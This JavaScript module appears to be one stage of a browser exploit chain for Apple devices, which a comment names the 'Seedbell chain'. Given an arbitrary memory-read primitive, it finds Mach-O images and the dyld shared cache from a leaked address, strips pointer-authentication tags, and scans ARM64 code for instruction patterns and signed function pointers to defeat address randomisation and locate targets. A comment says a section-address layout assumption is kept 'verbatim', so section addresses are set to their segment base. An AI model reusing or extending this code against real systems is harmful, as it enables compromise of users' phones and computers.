export function createMachOEnvironment(reader) {
const toBigInt = BigInt;
const stripPointerTag = (value) => value & 0x7fffffffffn;

function memory() {
    return reader;
}

class ByteCursor {
    constructor(buffer) {
        this.bytes = new Uint8Array(buffer);
        this.offset = 0;
    }

    seek(offset) {
        this.offset = offset;
    }

    skip(size) {
        this.offset += size;
    }

    readByte() {
        return this.bytes[this.offset++];
    }

    readCString(maxLength = 256) {
        let result = "";
        for (let index = 0; index < maxLength; index++) {
            const byte = this.readByte();
            if (byte === 0) return result;
            result += String.fromCharCode(byte);
        }
        throw new Error("CString terminator was not found");
    }

    readULEB128() {
        let result = 0;
        let shift = 0;
        for (let index = 0; index < 128; index++) {
            const byte = this.readByte();
            result += (byte & 0x7f) << shift;
            shift += 7;
            if ((byte & 0x80) === 0) return result;
        }
        throw new Error("ULEB128 value is too large");
    }
}

class ExportTrie {
    constructor(buffer) {
        this.buffer = buffer;
    }

    find(symbol) {
        const cursor = new ByteCursor(this.buffer);
        let prefix = "";
        let finished = false;

        while (!finished) {
            finished = true;
            const terminalSize = cursor.readULEB128();
            if (terminalSize !== 0 && symbol === prefix) {
                const flags = cursor.readULEB128();
                if (flags !== 8 && flags !== 16) return cursor.readULEB128();
            }

            cursor.skip(terminalSize);
            const childCount = cursor.readByte();
            for (let child = 0; child < childCount; child++) {
                const suffix = cursor.readCString(4132);
                const childOffset = cursor.readULEB128();
                if (suffix.length > 0 && symbol.startsWith(prefix + suffix)) {
                    prefix += suffix;
                    cursor.seek(childOffset);
                    finished = false;
                    break;
                }
            }
        }

        return null;
    }
}

class MachOImage {
    static findFromAddress(address) {
        let page = address - (address % 0x1000n);
        for (let index = 0; index < 0x10000; index++) {
            if (memory().read32(page) === 0xfeedfacf) return MachOImage.parse(page);
            page -= 0x1000n;
        }
        throw new Error("Mach-O header was not found within 256 MiB");
    }

    static parse(baseAddress) {
        const reader = memory();
        const commandCount = reader.read32(baseAddress + 16n);
        const segments = [];
        let exportTrieCommand = null;
        let slide = null;
        let commandOffset = 32;

        for (let index = 0; index < commandCount; index++) {
            const commandAddress = baseAddress + toBigInt(commandOffset);
            const command = reader.read32(commandAddress);
            const commandSize = reader.read32(commandAddress + 4n);

            if (command === 0x19) {
                const sectionCount = reader.read32(commandAddress + 64n);
                const segment = {
                    name: reader.readString(commandAddress + 8n, 16),
                    vmAddress: reader.read64(commandAddress + 24n),
                    vmSize: reader.read64(commandAddress + 32n),
                    fileOffset: reader.read64(commandAddress + 40n),
                    fileSize: reader.read64(commandAddress + 48n),
                    maxProtection: reader.read32(commandAddress + 56n),
                    initialProtection: reader.read32(commandAddress + 60n),
                    flags: reader.read32(commandAddress + 68n),
                    address: undefined,
                    sections: [],
                    section(name) {
                        for (const section of this.sections) {
                            if (section.name === name) return section;
                        }
                        return null;
                    }
                };

                for (let sectionIndex = 0; sectionIndex < sectionCount; sectionIndex++) {
                    const sectionAddress = commandAddress + 72n + toBigInt(80 * sectionIndex);
                    segment.sections.push({
                        name: reader.readString(sectionAddress, 16),
                        vmAddress: reader.read64(sectionAddress + 32n),
                        vmSize: reader.read64(sectionAddress + 40n),
                        fileOffset: reader.read64(sectionAddress + 48n),
                        address: undefined
                    });
                }

                if (segment.name === "__TEXT") {
                    if (slide !== null) throw new Error("Mach-O has multiple __TEXT segments");
                    slide = baseAddress - segment.vmAddress;
                }
                segments.push(segment);
            } else if (command === 0x80000022 || command === 0x80000033) {
                if (exportTrieCommand !== null) {
                    throw new Error("Mach-O has multiple export trie commands");
                }
                const fieldOffset = command === 0x80000022 ? 40 : 8;
                exportTrieCommand = {
                    fileOffset: reader.read32(commandAddress + toBigInt(fieldOffset)),
                    size: reader.read32(commandAddress + toBigInt(fieldOffset + 4))
                };
            }

            commandOffset += commandSize;
        }

        if (slide === null) throw new Error("Mach-O __TEXT segment is missing");

        const namedSegments = {};
        const unnamedSegments = [];
        for (const segment of segments) {
            segment.address = segment.vmAddress + slide;
            for (const section of segment.sections) {
                // The original Seedbell chain intentionally anchors section scans at
                // the containing segment. Preserve that layout assumption verbatim.
                section.address = segment.vmAddress + slide;
            }
            if (segment.name.length > 0) namedSegments[segment.name] = segment;
            else unnamedSegments.push(segment);
        }

        let exportTrie = null;
        if (exportTrieCommand !== null && namedSegments.__LINKEDIT !== undefined) {
            const linkedit = namedSegments.__LINKEDIT;
            const trieAddress =
                linkedit.address +
                toBigInt(exportTrieCommand.fileOffset) -
                linkedit.fileOffset;
            const words = new Uint32Array((exportTrieCommand.size + 3) >> 2);
            for (let index = 0; index < words.length; index++) {
                words[index] = reader.read32(trieAddress + toBigInt(4 * index));
            }
            exportTrie = new ExportTrie(words.buffer);
        }

        return new MachOImage(baseAddress, namedSegments, unnamedSegments, exportTrie);
    }

    constructor(baseAddress, segments, unnamedSegments, exportTrie) {
        this.baseAddress = baseAddress;
        this.segments = segments;
        this.unnamedSegments = unnamedSegments;
        this.exportTrie = exportTrie;
    }

    segment(name) {
        return this.segments[name] === undefined ? null : this.segments[name];
    }

    export(symbol) {
        if (this.exportTrie === null) throw new Error("Mach-O export trie is missing");
        const offset = this.exportTrie.find(symbol);
        return offset === null ? null : this.baseAddress + toBigInt(offset);
    }
}

class CodeScanner {
    constructor() {}

    findExportPointer({ symbol, exportingImage, pointerImage }) {
        const target = exportingImage.export(symbol);
        if (target !== null) {
            for (const segmentName of ["__AUTH", "__AUTH_CONST", "__DATA", "__DATA_DIRTY"]) {
                const segment = pointerImage.segment(segmentName);
                if (segment === null) continue;
                for (let offset = 0n; offset < segment.vmSize; offset += 8n) {
                    const candidate = memory().read64(segment.address + offset);
                    if (stripPointerTag(candidate) === target) return candidate;
                }
            }
        }
        return null;
    }

    findCodePointer({ image, pattern }) {
        const text = image.segment("__TEXT");
        if (text === null) return null;
        for (const segmentName of ["__AUTH", "__AUTH_CONST", "__DATA", "__DATA_DIRTY"]) {
            const segment = image.segment(segmentName);
            if (segment === null) continue;
            for (let offset = 0n; offset < segment.vmSize; offset += 8n) {
                const candidate = memory().read64(segment.address + offset);
                const address = stripPointerTag(candidate);
                if (
                    text.address <= address &&
                    address <= text.address + text.vmSize &&
                    this.matches(address, pattern)
                ) {
                    return candidate;
                }
            }
        }
        return null;
    }

    findPattern(image, pattern, after = null) {
        const text = image.segment("__TEXT");
        if (text === null) return null;
        let offset = after === null ? 0n : after - text.address;
        while (offset < text.vmSize) {
            const address = text.address + offset;
            if (this.matches(address, pattern, false)) return address;
            offset += 4n;
        }
        return null;
    }

    branchTargets(address, byteLength = 64) {
        const targets = [];
        for (let offset = 0n; offset < toBigInt(byteLength); offset += 4n) {
            const instructionAddress = address + offset;
            const instruction = memory().read32(instructionAddress);
            const opcode = toBigInt(instruction) & 0xfc000000n;
            if (opcode === 0x14000000n || opcode === 0x94000000n) {
                targets.push(instructionAddress + toBigInt(4 * this.branchImmediate(instruction)));
            }
        }
        return targets;
    }

    findPatternNear(address, pattern, byteLength = 64) {
        for (let offset = 0n; offset < toBigInt(byteLength); offset += 4n) {
            const candidate = address + offset;
            if (this.matches(candidate, pattern, false)) return candidate;
        }
        return null;
    }

    branchImmediate(instruction) {
        return instruction << 6 >> 6;
    }

    matches(address, pattern, followUnconditionalBranch = true) {
        const masks = [];
        let adrpCount = 0;
        for (const instruction of pattern) {
            const value = toBigInt(instruction);
            if ((value & 0x9f000000n) === 0x90000000n) {
                masks.push(0x9f00001fn);
                adrpCount++;
            } else if (adrpCount > 0 && (value & 0xffc00000n) === 0xf9400000n) {
                masks.push(0xffc003ffn);
            } else if (
                (value & 0xfc000000n) === 0x14000000n ||
                (value & 0xfc000000n) === 0x94000000n
            ) {
                masks.push(0xfc000000n);
            } else {
                masks.push(0xffffffffn);
            }
        }

        let cursor = address;
        for (let index = 0; index < pattern.length; index++) {
            const instruction = memory().read32(cursor);
            if (
                (toBigInt(pattern[index]) & masks[index]) !==
                (toBigInt(instruction) & masks[index])
            ) {
                return false;
            }
            if (
                followUnconditionalBranch &&
                (toBigInt(instruction) & 0xfc000000n) === 0x14000000n
            ) {
                cursor += toBigInt(4 * this.branchImmediate(instruction));
            } else {
                cursor += 4n;
            }
        }
        return true;
    }

    adrpLdrTargetsUntilReturn(address, byteLength = 768, stopInstruction = null) {
        const targets = [];
        const registers = new Array(32).fill(null);
        let reachedTerminator = false;

        for (let offset = 0; offset < byteLength; offset += 4) {
            const instructionAddress = address + toBigInt(offset);
            const instruction = toBigInt(memory().read32(instructionAddress));
            if (stopInstruction !== null && instruction === stopInstruction) {
                reachedTerminator = true;
                break;
            }
            if (instruction === 0xd65f0fffn || instruction === 0xd65f03c0n) {
                reachedTerminator = true;
                break;
            }

            if ((instruction & 0x9f000000n) === 0x90000000n) {
                const immediateHigh = instruction << 8n >> 13n;
                const immediateLow = (instruction >> 29n) & 3n;
                const destination = Number(instruction & 0x1fn);
                const pageDelta = BigInt.asIntN(
                    32,
                    ((immediateHigh << 2n) | immediateLow) << 12n
                );
                registers[destination] =
                    instructionAddress - (instructionAddress % 0x1000n) + pageDelta;
            } else if ((instruction & 0xffc00000n) === 0xf9400000n) {
                const source = Number((instruction >> 5n) & 0x1fn);
                const immediate = (instruction >> 10n) & 0xfffn;
                const page = registers[source];
                if (page !== null) {
                    targets.push(page + 8n * immediate);
                    registers[source] = null;
                }
            }
        }

        if (!reachedTerminator) throw new Error("Instruction scan reached its byte limit");
        return targets;
    }

    branchLeadsToString(branchAddress, targetImage, expectedString) {
        const dataConst = targetImage.segment("__DATA_CONST");
        if (dataConst === null) throw new Error("Target __DATA_CONST segment is missing");
        const instruction = memory().read32(branchAddress);
        if ((toBigInt(instruction) & 0xfc000000n) !== 0x14000000n) return false;

        const destination = branchAddress + toBigInt(4 * this.branchImmediate(instruction));
        try {
            const targets = this.adrpLdrTargetsUntilReturn(destination, 768, 0xd4200020n);
            if (targets.length !== 2) return false;
            const pointerSlot = targets[0];
            if (
                pointerSlot <= dataConst.address ||
                pointerSlot >= dataConst.address + dataConst.vmSize
            ) {
                return false;
            }
            return memory().readString(memory().read64(pointerSlot), expectedString.length + 48) === expectedString;
        } catch (error) {
            return false;
        }
    }

    findPointerToValidatedFunction(pointerImage, codeImage, expectedString) {
        const source = pointerImage;
        const target = codeImage;
        const text = target.segment("__TEXT");
        if (text === null) throw new Error("Target __TEXT segment is missing");

        for (const segmentName of ["__AUTH_CONST", "__DATA_CONST", "__AUTH"]) {
            const segment = source.segment(segmentName);
            if (segment === null) continue;
            for (let offset = 0n; offset < segment.vmSize; offset += 8n) {
                const signedPointer = memory().read64(segment.address + offset);
                const address = stripPointerTag(signedPointer);
                if (
                    text.address <= address &&
                    address <= text.address + text.vmSize &&
                    address % 4n === 0n &&
                    this.branchLeadsToString(address, target, expectedString)
                ) {
                    return signedPointer;
                }
            }
        }
        throw new Error("Validated shared-cache function pointer was not found");
    }
}

class SharedCacheContext {
    static fromImageAddress(address) {
        const image = MachOImage.findFromAddress(address);
        const text = image.segment("__TEXT");
        if (text === null) throw new Error("Leaked image has no __TEXT segment");

        const slide = image.baseAddress - text.vmAddress;
        const cacheHeader = image.baseAddress - text.fileOffset;
        const imagesOffset = memory().read32(cacheHeader + 0x1c0n);
        const imagesCount = memory().read32(cacheHeader + 0x1c4n);
        const imageTable = cacheHeader + toBigInt(imagesOffset);
        const images = [];

        for (let index = 0; index < imagesCount; index++) {
            const record = imageTable + toBigInt(32 * index);
            const imageAddress = stripPointerTag(memory().read64(record)) + slide;
            const pathOffset = memory().read32(record + 0x18n);
            images.push({
                path: memory().readString(cacheHeader + toBigInt(pathOffset), 1024),
                address: imageAddress,
                parsed: image.baseAddress === imageAddress ? image : null
            });
        }

        return new SharedCacheContext(slide, images);
    }

    constructor(slide, images) {
        this.slide = slide;
        this.images = images;
        this.scanner = new CodeScanner();
        this.targets = null;
    }

    image(...pathFragments) {
        for (const fragment of pathFragments) {
            for (const image of this.images) {
                if (image.path.indexOf(fragment) !== -1) {
                    if (image.parsed === null) image.parsed = MachOImage.parse(image.address);
                    return image.parsed;
                }
            }
        }
        throw new Error("Shared-cache image was not found: " + pathFragments.join(", "));
    }
}

return { MachOImage, CodeScanner, SharedCacheContext };
}
